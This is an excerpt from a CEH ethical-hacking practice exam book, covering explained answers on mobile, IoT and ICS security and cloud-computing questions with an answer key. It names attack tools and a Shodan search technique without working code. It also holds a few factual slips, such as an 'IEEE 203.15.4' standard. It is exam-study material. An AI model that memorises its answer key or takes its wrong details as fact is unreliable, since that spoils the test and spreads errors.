D. Paros Proxy

☑ C. This is another tool-specific question, but one that should be relatively easy.
Blackjacking and BBProxy were exposed at Defcon several years ago, so this isn’t anything
new in terms of an attack. In short, a Blackberry device is, in effect, part of the internal
network, and configuring an attack properly on the handset may provide access to

Chapter 8: Mobile Communications and the IoT

195

08-ch08.indd 195 20/04/22 12:17 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 8

resources on the internal network. BBProxy is used in part of this attack, and you can see
the whole thing pulled off at the following link from the original presentation in 2006:

www.praetoriang.net/presentations/blackjack.html

☐✗ A, B, and D are incorrect because these tools aren’t used in blackjacking attempts.
Aircrack is used in wireless network encryption cracking, and Paros is a proxy service,
but neither is used in blackjacking. BBCrack doesn’t exist.

3. Which of the following tools is a vulnerability scanner for Android devices?

A. X-ray

B. evasi0n7

C. Pangu

D. DroidSheep Guard

☑ A. Mobile tools will pop up all over the place on your exam, so do your best to get
as much exposure to as many of them as possible. X-ray is an Android vulnerability
scanner explicitly called out by EC-Council. It searches out unpatched vulnerabilities
and automatically updates for new vulnerability signatures as they are discovered.

☐✗ B and C are incorrect because both are jailbreaking applications for iOS devices.

☐✗ D is incorrect because DroidSheep Guard is a tool that monitors the ARP table on
your phone, alerting on suspicious entries and disabling shady Wi-Fi connections.

4. Which type of jailbreaking allows user-level access but does not allow iBoot-level access?

A. iBoot

B. Bootrom

C. Userland

D. iRoot

☑ C. I don’t own an iPhone, iPod, or iAnything, and have no desire to. However, since
iOS is one of the most popular mobile device operating systems, I have to have at
least some working knowledge of it. And you do, too, if you want to be a CEH.
Jailbreaking an iPhone is the process of removing the software restrictions imposed
by Apple so you can install a modified set of kernel patches, thereby allowing you to
run whatever software or updates you want. EC-Council lists three main methods of
jailbreaking, two of which (iBoot and Bootrom) allow something called iBoot access.
iBoot access basically refers to the ability to affect the firmware itself.

Userland is a term referring to the software running on the iOS device after the
kernel has loaded. Therefore, a userland jailbreak, being entirely software based, can
be patched by Apple after the effort. Userland jailbreaks include JailbreakMe Star,
Saffron, Spirit, Absinthe, evasi0n, and Pangu.

CEH Certified Ethical Hacker Practice Exams

196

08-ch08.indd 196 20/04/22 12:17 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 8

☐✗ A and B are incorrect because both jailbreaking efforts allow iBoot access. In other
words, each method allows for boot chain-of-trust and firmware update.

☐✗ D is incorrect because this is not a type of jailbreaking.

5. Jack receives a text message on his phone advising him of a major attack at his bank. The
message includes a link to check his accounts. After he clicks the link, an attacker takes
control of his accounts in the background. Which of the following attacks is Jack facing?

A. Phishing

B. Smishing

C. Vishing

D. App sandboxing

☑ B. Smishing is the term given to a mobile device attack whereby an attacker sends an
SMS text message to a target with an embedded link. If the user clicks the malicious
link, the attacker gains valuable information and control. These attacks are successful
for largely the same reasons phishing is so effective in the e-mail world—people
just click through sometimes without pausing to think about it. Users who would
otherwise ignore an e-mail with a link in it from an unknown (or even known) source
sometimes don’t think twice when the link is in a text message.

☐✗ A is incorrect because the term phishing refers to e-mail messaging and works in much
the same way as smishing.

☐✗ C is incorrect because vishing is a term referring to the use of phone calls and voice
messaging to carry out an attack.

☐✗ D is incorrect because app sandboxing is not an attack on its own: it’s a security
measure designed to limit resources an application can access on a mobile device.

6. Which of the following allows an Android user to attain privileged control of the device?

A. DroidSheep

B. SuperOneClick

C. Faceniff

D. ZitMo

☑ B. Rooting of an Android device is the same idea as jailbreaking an iOS one:
allowing the user total control over the device to add applications, modify system
files and actions, and (in some cases and usually risking security to do so) improve
performance. Rooting can be done in a variety of methods, but some tools you can
use are SuperOneClick, Superboot, One Click Root, and Kingo. With SuperOneClick,
you simply connect the phone to a system over USB (ensuring it’s in charge mode
only), enable USB Debugging, and run the application.

☐✗ A is incorrect because DroidSheep is a tool used for session hijacking on Android
devices. It can extract session IDs and sidejack on WEP, WPA, and WPA2 networks.

Chapter 8: Mobile Communications and the IoT

197

08-ch08.indd 197 20/04/22 12:17 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 8

☐✗ C is incorrect because Faceniff is a sniffer for Android, designed to sniff and intercept
web profiles.

☐✗ D is incorrect because ZitMo (Zeus-in-the-Mobile) is a banking Trojan. ZitMo can
even enable bot-like command and control for attackers over the infected device.

7. An individual attempts to make a call using his cell phone; however, it seems
unresponsive. After a few minutes of effort, he turns it off and turns it on again. During
his next phone call, the phone disconnects and becomes unresponsive again. Which
Bluetooth attack is underway?

A. Bluesmacking

B. Bluejacking

C. Bluesniffing

D. Bluesnarfing

☑ A. From the description, it appears the phone is either defective or—since it’s spelled
out so nicely in the question for you—there is a denial-of-service attack against the
phone. Bluesmacking is a denial-of-service attack on a Bluetooth device. An attacker
somewhere nearby (within ten meters or, for the real bad guys, farther away using a big
enough transmitter, amplifier, and antenna) is using something like the Linux Bluez
packages (www.bluez.org) to carry out a DoS against the phone.

☐✗ B is incorrect because Bluejacking involves sending unsolicited messages—much like
spam—to a Bluetooth device.

☐✗ C is incorrect because Bluesniffing is a basic sniffing attempt, where the device’s
transmissions are sniffed for useful information.

☐✗ D is incorrect because Bluesnarfing refers to the actual theft of data directly from
the device. This takes advantage of the “pairing” feature of most Bluetooth devices,
willingly seeking out other devices to link up with.

8. Which of the following is a pairing mode in Bluetooth that rejects every pairing request?

A. Non-pairing

B. Non-discoverable

C. Promiscuous

D. Bluejack

☑ A. When you get a simple question on the exam, celebrate. Bluetooth has two pairing
modes and three discovery modes. Pairing—the decision to pair with another device
requesting it—is either turned on (pairing mode, where every request is accepted) or
off (non-pairing mode, where every request is rejected). Discovery—the decision to
respond to search requests and let the inquiry know the device is live and available—
can be fully on (discoverable mode, responding to everything from everyone),
partially on (limited-discoverable mode, responding only during a short time span),
or off altogether (non-discoverable mode, never answering an inquiry).

CEH Certified Ethical Hacker Practice Exams

198

08-ch08.indd 198 20/04/22 12:17 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 8

☐✗ B is incorrect because non-discoverable is a discovery mode, not a pairing one.

☐✗ C is incorrect because promiscuous has no meaning in this context.

☐✗ D is incorrect because Bluejack refers to a Bluetooth attack where an attacker can
leverage the target phone’s contacts, resulting in anonymous, unsolicited message
transmission to targets.

9. An attacker is using Shodan to search for devices on a target. She types the following
as the search string: webcam geo:“ -85.97,31.81”. Which of the following statements
correctly describes this action?

A. The search string syntax is incorrect.

B. The attacker is searching for webcams with serial numbers starting with numbers
between 3181 and 8597.

C. The attacker is searching for webcam manufacturers starting with “geo.”

D. The attacker is searching for webcams in the geographic location -31.80, 85.95
(longitude and latitude).

☑ D. While Google and other search engines index the Web, Shodan (https://www
.shodan.io) indexes everything connected to the Internet. It’s an incredible search
engine tool for, well, everything. Want to find Samsung wearables in a specific city?
Grab a model number and use the city: filter. How about IIS servers on a specific
subnet? Try iis net:xxx.xxx.xxx.xxx/yy (where the x’s are your subnet and yy is your
CIDR notation). If you want to get really specific on your location, you can use the
geo: filter, along with latitude and longitude coordinates. The Shodan geo: filter
actually accepts between two and four coordinate parameters. The example used two,
showing a latitude/longitude pair. If the example used three coordinates, they would
represent latitude, longitude, and range. Add a fourth coordinate, and you create
a geographic box to search in: top-left latitude, top-left longitude, bottom-right
latitude, bottom-right longitude.

☐✗ A is incorrect because there’s nothing wrong with the syntax. As a matter of fact,
Shodan will accept almost anything you type as a search string, which can sometimes
get you some really weird responses.

☐✗ B is incorrect because this syntax has nothing to do with serial numbers.

☐✗ C is incorrect because this syntax has nothing to do with manufacturer names.

10. Which of the following is the most popular short-range communication technology for
IoT devices?

A. RFID

B. Zigbee

C. QR codes

D. LiFi

Chapter 8: Mobile Communications and the IoT

199

08-ch08.indd 199 20/04/22 12:17 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 8

☑ B. IoT devices make use of many wireless communications technologies, and some of
them have fairly weird names. Zigbee is, according to EC-Council, the world’s most
popular IoT device communication technology. As a result, you should know that
it is based on the IEEE 203.15.4 standard, and you can use tools like KillerBee to
attack devices using it. Yes, I know this is a weird thing to ask a question about. No, I
didn’t do it because I’m a sadist. Know Zigbee. Learn it well. You’ll thank me later.

☐✗ A, C, and D are all incorrect for the same reason—they’re not the most popular
communication technology for IoT devices according to CEH material. But I
thought I’d include some information on each of them for your study purposes, in
case you see something weird on the exam about them.

RFID is probably the most familiar to everyone, as it has been around and in the
public eye longer than most everything else. I mean, who hasn’t heard of an RFID-
blocking wallet? QR codes are those scannable, readable tags that hold information
about a device, product, or item. If you’ve flown anywhere lately, I’m sure you’ve seen
folks using their phone as their boarding pass, scanning the QR code to go sit in a
metal tube as soon as possible.

LiFi is possibly the weirdest item on this list, and one I had honestly never heard
of until prepping for this edition. LiFi is sort of like Wi-Fi in the same sense that a
Lamborghini is like a Chevy Uplander minivan. Sure, packets are encoded and used
much the same way, but LiFi uses light from LED bulbs to get it done. Because it
uses light, speeds are incredible—up to 224 Gbps—and the interference you deal
with in wireless signal communications is nonexistent, but for now it’s simply in its
infancy. That said, invest in LED bulbs for your home soon—LiFi may be your next
big networking adventure.

11. Within the IoT architecture, which of the following carries out message routing and
identification?

A. Edge Technology layer

B. Access Gateway layer

C. Internet layer

D. Middleware layer

☑ B. IoT architecture, laid out by EC-Council, includes the Edge Technology, Access
Gateway, Internet, Middleware, and Application layers. Each of these has information
worth remembering for your exam, and in this case we’re talking about the Access
Gateway layer. Here, we find the gap between the device and the client, and the first
data handling occurs in this layer. Message routing, identification, and subscribing
occur here.

☐✗ A, C, and D are all incorrect for the same reason—these layers provide different
services than what is being asked about. The Edge Technology layer holds technologies
like RFID tags and other readers that monitor, sense, and report on the environment.
The main function of this layer is data collection and connection of devices within

CEH Certified Ethical Hacker Practice Exams

200

08-ch08.indd 200 20/04/22 12:17 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 8

the network. The Internet layer is probably the one that tripped you up here, but
there’s a very good explanation—or at least an explanation. The question is asking
about IoT architecture, not what you know to be real-world networking. In IoT
architecture, the Internet layer is referred to as the crucial one, serving as the main
component carrying out communication in each of the IoT data models. Lastly,
the Middleware layer is exactly what it sounds like—the layer sitting in the middle,
behaving as an interface for data and device management.

12. A homeowner accesses an app on his cell phone to set up a view list on his television.
Which IoT communication model is in play here?

A. Device-to-gateway

B. Back-end data sharing

C. Device-to-cloud

D. Device-to-device

☑ A. IoT communication models seem pretty straightforward, but there are some
weird one-off comparisons here and there. In this case, the smartphone—more
appropriately, the app on the smartphone used by the owner—acts as the gateway,
and the TV is the device. In device-to-gateway, the IoT device communicates with an
intermediary—a gateway—which in turn communicates with the cloud service. As
an aside, and a good study/memorization tip, the gateway is almost always an app on
a smartphone.

☐✗ B is incorrect because this does not describe the back-end data-sharing
communications model. Back-end data sharing extends the connectivity of the cloud
(from the device or a gateway) to a third party.

☐✗ C is incorrect because this does not describe device-to-cloud. IoT devices
communicate directly with the cloud instead of with the client in this model. A
prime example of this would be a security camera you access remotely. The camera,
which is the IoT device, doesn’t communicate directly with you, the client. It instead
uploads to the cloud, and you interact there for the data—after inputting correct
credentials, of course.

☐✗ D is incorrect because this doesn’t describe device-to-device. Popular with
wearables and smart home devices (light bulbs and thermostats come to mind), this
communication model sees the IoT devices communicating directly with one another
over Wi-Fi (or another technology like Zigbee or Bluetooth).

13. In which attack on VANET do vehicles appear to be in multiple places at once, causing
congestion and severely impairing the use of data?

A. Rolling code

B. BlueBorne

C. Side channel

D. Sybil

Chapter 8: Mobile Communications and the IoT

201

08-ch08.indd 201 20/04/22 12:17 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 8

☑ D. As with every other area in computing, IoT has loads of attacks and vulnerabilities
to talk about. In this particular example, called the Sybil attack, a vehicle or device
creates the illusion of another identity (in this example, being in more than one place at
a time), causing congestion and the associated insanity that goes along with it. When it
comes to VANET (vehicular ad-hoc network), this could be particularly dangerous. On
a standard network, it can cause numerous DDoS problems.

☐✗ A is incorrect because this does not describe the rolling code attack, where the attacker
jams the signal and then sniffs the code used to lock and unlock a vehicle.

☐✗ B is incorrect because this does not describe the BlueBorne attack. BlueBorne refers
to an effort that attacks nearby Bluetooth-enabled devices, which are then leveraged
(using Bluetooth vulnerabilities) to launch further attacks.

☐✗ C is incorrect because this does not describe a side-channel attack, where information
on encryption keys is extracted from different IoT signal emissions.

14. Of the tools listed, which is the best choice for quickly discovering IP addresses of IoT
devices on your network?

A. IoTInspector

B. MultiPing

C. Z-Wave Sniffer

D. beSTORM

☑ B. Many of the tools you already know about will work just as well in IoT land, and
MultiPing (https://www.multiping.com/) is a good example. MultiPing has been
around for a while and is a quick-and-dirty way to discover systems hanging out on
your network. Even those pesky IoT devices can be found using it. Is MultiPing the
absolute best way to discover your IoT devices? Probably not. Will it work quickly,
as described in this question? Absolutely.

☐✗ A and D are incorrect for the same reason—both of these are vulnerability scanners
for IoT devices.

☐✗ C is incorrect because Z-Wave Sniffer is a tool for sniffing IoT traffic.

15. In October 2016, a DDoS attack involving millions of IoT devices caused a disruption of
service to large numbers of users in North America and Europe. Which of the following
malware was used in the attack?

A. WannaCry

B. Cryptolocker

C. Locky

D. Mirai

☑ D. It’s hard to believe something as simple as a baby monitor can be leveraged as
an attack platform, but in the fall of 2016 that’s exactly what happened. The Mirai
malware, created to deliberately find IoT devices to infect, created a botnet of

CEH Certified Ethical Hacker Practice Exams

202

08-ch08.indd 202 20/04/22 12:17 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 8

immense proportions. This was then leveraged in a series of distributed denial-of-
service attacks against systems operated by the DNS provider Dyn (since acquired by
Oracle). The attack caused major disruptions across North America and Europe and
serves as a lasting reminder that security for IoT is sorely lacking. As an interesting
aside, the original Mirai attack worked because it made use of something any first-
year college student in cybersecurity would be able to recognize as a dumb security
oversight—it used default credentials commonly used by a bunch of IoT devices.

☐✗ A, B, and C are all incorrect because none of these had anything to do with the
famous Dyn attack. WannaCry was a ransomware attack starting in May 2017 that
leveraged missing Microsoft patches as its vector. Both Cryptolocker and Locky were
also ransomware attacks, in 2013 and 2016, respectively.

16. Which of the following are valid countermeasures in the prevention of IoT hacking?
(Choose all that apply.)

A. Disable guest and demo accounts.

B. Enable lockout features for excessive login attempts.

C. Disable Telnet.

D. Implement patch management and ensure device firmware is up to date.

☑ A, B, C, D. I was going to say that securing IoT is the same as securing everything
else, but that wouldn’t be wholly true. It’s not that the same countermeasures
shouldn’t be used—of course the same basic-level approach applies across the board.
Disabling unused services, ports, and built-in accounts, changing default passwords,
enabling lockout mechanisms, and making sure your patch levels are current are all
basic items of security note no matter what you’re talking about. It’s not the measures
themselves that make securing IoT so difficult—the rub is keeping up with them.

As discussed in the companion book, CEH Certified Ethical Hacker All-in-One Exam
Guide, Fifth Edition, IoT is expanding by the day, and a semi-secured network today
might be blown wide open by the addition of someone’s BYOD Internet-enabled
underwear tomorrow (don’t laugh, it’s actually a thing now). Countermeasures for
securing IoT are the same as you’d see anywhere else, with a few additional CEH items
thrown in for good measure (for example, ECC recommends you monitor port 48101
well, since IoT malware has been known to spread using it). Questions regarding this
topic should be of the commonsense variety for you, so prepping for your exam in
this arena is relatively easy. However, in the real world, vigilance—unending, tiring,
monotonous, Sisyphus-level vigilance—is really going to be your only hope.

17. Within the Attify Zigbee Framework, which of the following is used to discover target
devices within range?

A. zbstumbler

B. zbdump

C. zbreplay

D. zbassoc/flood

Chapter 8: Mobile Communications and the IoT

203

08-ch08.indd 203 20/04/22 12:17 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 8

☑ A. Let’s play a little Q&A game, shall we? I’ll introduce you to a collection of tools,
presented by Attify in its Zigbee Framework, and then ask you to identify what each
does without you ever seeing the tool, based solely on the knowledge you have from
studying the rest of your CEH material. Ready? Here we go: Identify zbstumbler.
Identify zbdump. Now identify zbreplay. See a pattern yet? These are all the same
names and functions you’ve seen in other toolsets, except these start with zb. In this
case, zbstumbler is a lot like NetStumbler, allowing you to ID devices within range.

Now, before anyone gets all preachy on me, I am not advising you to ignore the
framework and just memorize terms for an exam. Indeed, it’s quite the opposite—
I want you to actually know how to use these tools so that when you pass your
exam, the certification will matter. Go grab the framework (https://github.com/
attify/Attify-Zigbee-Framework) and practice. Find a light bulb in your house
and attack it (you can watch someone do it here: https://www.youtube.com/
watch?v=uivlSdqWS48). When you see identification questions like this on the exam,
just use common sense.

☐✗ B is incorrect because zbdump acts as the packet capture tool for the framework.

☐✗ C is incorrect because zbreplay allows you to replay portions of a packet capture to
force the device to do your bidding.

☐✗ D is incorrect because zbassoc/flood is a DDoS function within the framework.

18. Which of the following is an advanced hardware- and software-designed radio used for
security testing in IoT?

A. Fluke

B. Raspberry Pi

C. HackRF One

D. Alfa AWUS036NH

☑ C. There are few certainties in life—the rising and setting of the sun every day,
lovebugs making life miserable for a couple months each year in the South, and
ever-increasing taxes on everything from income to gas. One you can add to your
list is HackRF One being on your CEH exam. This handy little piece of hardware
exploded onto the scene in a Kickstarter campaign in 2014. Its creator, Michael
Ossmann, called it Project Jawbone back then, and its open source nature attracted a
lot of attention. On the good side, information security folks saw a great tool to help
in testing their wireless offerings. On the bad side, hackers immediately saw a quick-
and-easy way to jam, disrupt, and hack IoT devices everywhere.

For the just under $300, you too can own a HackRF One device (https://
greatscottgadgets.com/hackrf/). According to the website, HackRF One was
“designed to enable test and development of modern and next generation radio
technologies...and is an open source hardware platform that can be used as a USB
peripheral or programmed for stand-alone operation.” What’s really interesting (and

CEH Certified Ethical Hacker Practice Exams

204

08-ch08.indd 204 20/04/22 12:17 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 8

quite humorous to me), however, is the very next statement: “HackRF One is test
equipment for RF systems. It has not been tested for compliance with regulations
governing transmission of radio signals. You are responsible for using your HackRF
One legally.”

HackRF One is capable of receiving and transmitting on a frequency range of 1 MHz
to 6 GHz, and it transmits and receives half-duplex. It has become a valuable and
prized hacking tool due to its ease of use. Just be careful, though. Remember, you are
responsible for its legal use.

☐✗ A, B, and D are all incorrect because these hardware devices and terms do not match
the capability noted in the question. Fluke is a manufacturer that creates, among
other things, spectrum analyzers and packet capturing/analysis devices. Raspberry
Pi is a small, single-board computer system designed to teach programming and
computer science concepts. The Alfa AWUS036NH is a small, powerful antenna
used in wireless hacking.

19. Which of the following is a model widely used to describe internal communications
within industrial control system (ICS) networks?

A. Purdue model

B. IIOT

C. SCADA

D. PLC

☑ A. The Purdue model, formerly called PERA (Purdue Enterprise Refence
Architecture), is simply a structural model for industrial control system (ICS)
networks that defines six distinct layers—with defined components and relevant
security controls for each.

Developed in the 1990s by the Purdue University Consortium for computer-
integrated manufacturing, it was adopted by ISA-99 and shows the connections and
dependencies of main components within a typical ICS.

The model splits ICS architecture into two zones (OT and IT), divided by a DMZ.
Each zone is further divided by levels relevant to specific component and function:

• Level 0 is the assets that send information to the programmable logic controllers
(PLCs), such as sensors, pumps, valves, and motors. Multiple types exist within
each (passive or active, analog or digital, and so on).

• Level 1 includes the PLCs, remote terminal units (RTUs), and intelligent
electronic devices (IEDs). These are the assets that monitor Level 1 and send
commands to the assets.

• Level 2 contains human-machine interfaces (HMIs) and SCADA software. These
monitor and manage overall processes within the system.

Chapter 8: Mobile Communications and the IoT

205

08-ch08.indd 205 20/04/22 12:17 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 8

• Level 3 holds all the systems that provide information on management of
production workflows.

• Level 4 includes enterprise resource planning (ERP) software and other systems
for managing operations logistics.

• Level 5 is the enterprise network itself.

☐✗ B, C, and D are all incorrect. IIOT (IT/OT Convergence) refers to the integration
of IT and OT systems for improving security. SCADA (supervisory control and
data acquisition) is the centralized supervisory control system for the infrastructure.
PLC is a small, solid-state system that has user-programmable memory for storing
instructions for the purpose of implementing specific functions.

20. Which IoT communication model adds the ability for third parties to collect and use data?

A. Device-to-device

B. Device-to-cloud

C. Device-to-gateway

D. Back-end data sharing

☑ D. Even if you didn’t know a thing about IoT communication models, this one had
to be at least somewhat obvious. In the back-end data-sharing model, the device
communicates directly via CoAP or HTTP to the application service provider, and
the data is then made available to third parties. As an aside, this method may or may
not make use of an internal gateway.

☐✗ A, B, and C are all incorrect. In device-to-device, the IoT devices communicate
directly to one another. In device-to-cloud, they communicate to, you guessed it,
a cloud provider. Device-to-gateway adds a collective that may help provide some
security controls.

CEH Certified Ethical Hacker Practice Exams

206

08-ch08.indd 206 20/04/22 12:17 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 9

CHAPTER

Security in Cloud 9
Computing
This chapter includes questions from the following topics:

• Identify cloud computing concepts
• Understand basic elements of cloud security
• Identify cloud security tools

I wanted to introduce this chapter by talking about how large and ubiquitous the topic of “cloud”
is and how, conversely, so few people in my circle of life know anything at all about it. I mean, we
use the term a lot—sometimes incorrectly—but very few people I interact with have any real idea
what “cloud” means and how it works. So I did what anyone else in my position would do—I ran
a Google search.

Opening my browser, I searched for “knowing just enough about a topic,” and instead of
finding exactly what I was looking for, I went down a wonderfully enlightening rabbit hole of
psychology and the human mindset.

I learned a pantomath is a person who wants to know everything, whereas a polymath is a
person who holds a wide expanse of knowledge over a substantial number of subjects. I learned
the Dunning–Kruger effect is a cognitive bias we all apparently have, to some degree, wherein
we overestimate our ability (and knowledge to talk about it intellectually) in tasks in which we
actually have low ability. And I learned we all have a tendency to view our own knowledge and
experience as better than average on almost anything we have even basic experience in.

What does this have to do with cloud? It’s enlightening, to me anyway, that so many of us
know so little about it, yet we seem to believe we’re smart enough on the topic already. Trust me,
we’re not (most of us, anyway).

Cloud computing isn’t anywhere near as exciting as the latest series you’re binge watching on
Netflix, but it is insanely important in today’s computing virtual world and something you really
need to learn more about. EC-Council added a brand-new chapter on the subject in their official
courseware in a previous version (9) and seemed to put a lot of focus on it then. In this particular
version, however, cloud simply isn’t as focused on a topic as it was before, making up a mere
6 percent of your exam. We’ll hit the highlights in this chapter, to ensure you have an idea of what
to study for your exam, but I highly encourage you to learn as much on this topic as you can.

207

09-ch09.indd 207 20/04/22 12:30 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 9

STUDY TIPS EC-Council tends to focus on lists, categories, and in-the-weeds
specificity in other topics, and cloud computing is no different. Know the
types and deployment models very well, and completely memorize NIST’s
reference architecture on cloud. There will no doubt be confusing

comparisons between terms (containers versus virtual machines, and so on) so make sure
you know the fine details very well. Most of the attacks and threats in cloud computing
are similar to everything else, but a couple are very specific, and those will likely find their
way onto your exam. Lastly, there aren’t a whole lot of cloud-specific tools to know, but
you will definitely need to be familiar with them.

CEH Certified Ethical Hacker Practice Exams

208

09-ch09.indd 208 20/04/22 12:30 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 9

QUESTIONS

1. Which of the following statements is true regarding cloud computing? Q
A. In IaaS, applications, data, middleware, virtualization, and servers are part of the

service provision.

B. In PaaS, applications, data, middleware, virtualization, and servers are part of the
service provision.

C. In SaaS, applications, data, middleware, virtualization, and servers are part of the
service provision.

D. None of the above.

2. Which of the following is a government-wide program that provides a standardized
approach to security assessment, authorization, and continuous monitoring for cloud
products and services?

A. NIST Cloud Architecture

B. FedRAMP

C. PCI DSS Cloud Special Interest Group

D. Cloud Security Alliance

3. A business owner is advised that inventory, storage, sales, and backup online services can
be provided less expensively and more securely via a cloud service. After investigating the
options, the business owner determines the best cloud service provider for his needs also
happens to be the provider for several of his competitors. Should he decide to engage the
same provider, which cloud service deployment model will be used?

A. Private

B. Multi-cloud

C. Community

D. Public

4. In “NIST Cloud Computing Reference Architecture,” which of the following is the
intermediary for providing connectivity between the cloud and the subscriber?

A. Cloud provider

B. Cloud carrier

C. Cloud broker

D. Cloud auditor

Chapter 9: Security in Cloud Computing

209

09-ch09.indd 209 20/04/22 12:30 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 9

5. A company relies on a private cloud solution for most of its internal computing needs.
After expanding into more online retailing, it relies on a portion of a public cloud for
external sales and e-commerce offerings. Which of the following best describes the cloud
deployment type in use?

A. Private

B. Public

C. Hybrid

D. Community

6. Cloud computing would be best suited for which of the following businesses?

A. A medical practice

B. An established rural general sales store

C. A law enforcement agency

D. A Christmas supply store

7. A software company has decided to build and test web applications in a cloud computing
environment. Which of the following cloud computing types best describes this effort?

A. IaaS

B. PaaS

C. SaaS

D. Community

8. Which of the following statements is not true?

A. Private cloud is operated solely for a single organization.

B. Public cloud makes use of virtualized servers.

C. Public cloud is operated over an intranet.

D. Private cloud makes use of virtualized servers.

9. A company relies solely on Google Docs, Google Sheets, and other cloud-based provisions
for its office documentation software needs. Which of the following cloud computing
types best describes this?

A. SaaS

B. PaaS

C. IaaS

D. Public

CEH Certified Ethical Hacker Practice Exams

210

09-ch09.indd 210 20/04/22 12:30 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 9

10. A subscriber purchases machine virtualization and hosting through Amazon EC2. Which
of the following cloud computing types does this describe?

A. IaaS

B. PaaS

C. SaaS

D. Hybrid

11. Which of the following are true statements regarding containers and virtualization?
(Choose two.)

A. Virtualization runs multiple operating systems on a single physical system.

B. Virtualization leverages multiple physical systems to create virtual operating systems.

C. Containers are placed on a single physical system and OS.

D. Multiple containers require multiple operating systems on the host device.

E. Containers and virtual machines are the same thing.

12. Which of the following attacks occurs during the translation of SOAP messages?

A. Wrapping attack

B. Cross-guest VM

C. Side channel

D. Session riding

13. Which of the following is an architectural pattern in computer software design in which
application components provide services to other components via a communications
protocol, typically over a network?

A. API

B. SOA

C. EC2

D. IaaS

14. In “NIST Cloud Computing Reference Architecture,” which entity manages cloud
services and maintains the relationship between cloud providers and subscribers?

A. Cloud broker

B. Cloud auditor

C. Cloud carrier

D. Cloud consumer

Chapter 9: Security in Cloud Computing

211

09-ch09.indd 211 20/04/22 12:30 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 9

15. Which of the following is not a benefit of virtualization?

A. It allows for more efficient backup, data protection, and disaster recovery.

B. It reduces system administration work.

C. It improves operational efficiency.

D. It locks individual hardware to each individual virtual machine.

16. A company acquires a cloud environment for much of its business IT needs. The
environment is used and operated solely for the single organization. Which of the
following represents the cloud deployment model in question?

A. Public

B. IaaS

C. Sole source

D. Private

17. Which of the following statements is true regarding cloud computing?

A. Security in the cloud is the responsibility of the provider only.

B. Security in the cloud is the responsibility of the consumer only.

C. Security in the cloud is the responsibility of both the consumer and the provider.

D. None of the above.

18. Which tool offers penetration-test-like services for Amazon EC2 customers?

A. CloudPassage Halo

B. Core Cloud

C. CloudInspect

D. Panda Cloud Office Protection

19. An attacker sets up a VM on the same physical cloud host as the target’s VM. He then
takes advantage of the shared physical resources to steal data. Which of the following
describes this attack?

A. Side channel

B. VM flood

C. Session riding

D. Cybersquatting

20. Which of the following is a container orchestration platform created by Google to
automate creating, managing, scaling, and deleting containers?

A. Docker

B. Kubernetes

C. Microservices

D. Serverless computing

CEH Certified Ethical Hacker Practice Exams

212

09-ch09.indd 212 20/04/22 12:30 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 9

QUICK ANSWER KEY

1. C 8. C 15. D

2. B 9. A 16. D

3. C 10. A 17. C

4. B 11. A, C 18. C

5. C 12. A 19. A

6. D 13. B 20. B

7. B 14. A

Chapter 9: Security in Cloud Computing

213

09-ch09.indd 213 20/04/22 12:30 PM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / Chapter 9

ANSWERS

A 1. Which of the following statements is true regarding cloud computing?

A. In IaaS, applications, data, middleware, virtualization, and servers are part of the
service provision.

B. In PaaS, applications, data, middleware, virtualization, and servers are part of the
service provision.

C. In SaaS, applications, data, middleware, virtualization, and servers are part of the
service provision.

D. None of the above.

☑ C. So there are several things EC-Council is very concerned that you know regarding
cloud computing, but two in particular are right at the top of the list. The concepts
of separation of duties and separation of responsibility—both of which are key
aims and benefits of cloud computing—keep popping up over and over again in
study materials and will be key to your success. Separation of duties is a provision
of all cloud computing types, but only one of the three takes care of everything. In
Software as a Service (SaaS), the service provider delivers the entirety of the span of
responsibility. Everything from applications and data through middleware and OS,
all the way down to the networking itself, is provided by the service provisioner. For
comparison sake, in Platform as a Service (PaaS), the service provider takes care of
everything except the applications and data. In Infrastructure as a Service (IaaS), the
client holds the applications, data, runtime, middleware, and OS, while the provider
takes care of everything else—virtualization, servers, storage, and networking.

☐✗ A, B, and D are incorrect because these are not true statements. In IaaS, the
subscriber holds applications, data, and middleware but not virtualization and
servers. In PaaS, the client only holds the applications and data.

2. Which of the following is a government-wide program that provides a standardized
approach to security assessment, authorization, and continuous monitoring for cloud
products and services?

A. NIST Cloud Architecture

B. FedRAMP

C. PCI DSS Cloud Special Interest Group

D. Cloud Security Alliance

☑ B. EC-Council, at least as of this writing, doesn’t mention one single regulatory effort
in cloud computing at all, outside of NIST’s reference architecture, in their official
courseware. This does not mean you will not see any cloud computing regulatory
efforts on your exam. I’m willing to bet you’ll see more and more of them as time
goes on, and FedRAMP is the 800-pound gorilla of cloud computing regulatory
